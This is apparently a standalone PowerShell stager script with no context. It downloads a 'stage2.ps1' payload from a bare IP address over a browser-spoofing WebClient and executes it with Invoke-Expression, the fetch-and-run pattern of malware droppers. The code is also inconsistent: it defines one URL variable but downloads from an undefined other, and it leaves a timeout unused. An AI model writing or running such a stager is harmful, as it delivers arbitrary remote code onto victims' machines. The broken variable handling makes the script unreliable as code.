
$TransferUrl = "http://203.0.113.54:8080/stage2.ps1"
$RequestTimeout = 162
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$StageScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($StageScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $StageScript.Length)
Invoke-Expression $StageScript

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
